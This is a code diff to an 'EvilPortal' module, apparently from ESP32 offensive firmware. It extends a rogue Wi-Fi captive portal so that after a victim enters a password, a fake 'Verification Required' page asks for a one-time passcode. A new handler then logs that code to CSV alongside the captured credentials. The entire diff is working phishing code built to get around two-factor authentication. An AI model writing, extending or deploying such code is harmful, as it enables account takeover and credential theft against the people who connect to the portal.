@@ -38,6 +38,7 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     String url = request->url();
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
+    else if (url == "/otp") _portal->otpController(request);
     else if (
         url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
         bruceConfig.evilPortalEndpoints.allowGetCreds
@@ -72,6 +73,7 @@ bool EvilPortal::setup() {
             loadDefaultHtml_one();
         } else {
             loadDefaultHtml();
+            loadOtpHtml();
         }
         return true;
     }
@@ -82,7 +84,7 @@ bool EvilPortal::setup() {
     addOptionToMainMenu();
 
     if (!_verifyPwd) {
-        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); }});
+        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); loadOtpHtml(); }});
     } else {
         options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
     }
@@ -224,6 +226,7 @@ void EvilPortal::setupRoutes() {
 
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
     webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
+    webServer.on("/otp", [this](AsyncWebServerRequest *request) { otpController(request); });
 
     if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
         webServer.on(
@@ -386,6 +389,8 @@ void EvilPortal::processRequests() {
 bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }
 
 String EvilPortal::getCapturedPassword() { return lastCred; }
+
+String EvilPortal::getCapturedOTP() { return lastOTP; }
 
 String EvilPortal::getCapturedSSID() { return apName; }
 
@@ -657,6 +662,30 @@ void EvilPortal::loadDefaultHtml() {
     isDefaultHtml = true;
 }
 
+void EvilPortal::loadOtpHtml() {
+    otpHtmlPage =
+        "<!DOCTYPE html><html><head><title>Verification Required</title><meta charset='UTF-8'><meta "
+        "name='viewport' content='width=device-width, initial-scale=1.0'><style>body{font-family: Arial, "
+        "sans-serif;align-items: center;justify-content: center;background-color: #FFFFFF;}input[type='text']"
+        "{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;"
+        "border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: 700px;}.logo-container{text-align: "
+        "center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;}.form-container"
+        "{background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px "
+        "0px rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: "
+        "20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: 4px;margin-bottom: "
+        "20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: none;padding: 12px 20px;"
+        "border-radius: 4px;font-size: 0.875rem;width: 100%;}.submit-btn:hover{background: #0e4eb3;}"
+        ".containerbtn{display: flex;justify-content: center;padding: 30px 0px 25px 0px;}"
+        ".info-text{text-align: center;color: #666;font-size: 14px;margin-bottom: 20px;}"
+        "@media screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}"
+        "</style></head><body><div class='container'><div class='form-container'><center><div>"
+        "<h1>Verification Required</h1><p class='info-text'>Enter the OTP code from your device</p>"
+        "</div></center><div style='min-height: 150px'><form action='/otp' id='otp-form'>"
+        "<input name='otp' class='input-field' type='text' placeholder='Enter OTP code' maxlength='10' required />"
+        "<div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Verify</button>"
+        "</div></form></div></div></div></body></html>";
+}
+
 void EvilPortal::portalController(AsyncWebServerRequest *request) {
     String apIp = WiFi.softAPIP().toString();
     String host = request->host();
@@ -732,12 +761,31 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             portalController(request);
         }
     } else {
+        // Store credentials and show OTP page
         saveToCSV(csvLine);
-        request->send(200, "text/html", wifiLoadPage());
+        request->send(200, "text/html", otpHtmlPage);
     }
 
     capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
     totalCapturedCredentials++;
+}
+
+void EvilPortal::otpController(AsyncWebServerRequest *request) {
+    String otpValue = "";
+    String csvLine = "";
+    
+    if (request->hasArg("otp")) {
+        otpValue = request->arg("otp");
+    }
+    
+    lastOTP = otpValue;
+    csvLine = "otp: " + otpValue;
+    
+    // Save OTP to CSV
+    saveToCSV(csvLine);
+    
+    // Send success/loading page
+    request->send(200, "text/html", wifiLoadPage());
 }
 
 String EvilPortal::getHtmlTemplate(const String &body) {
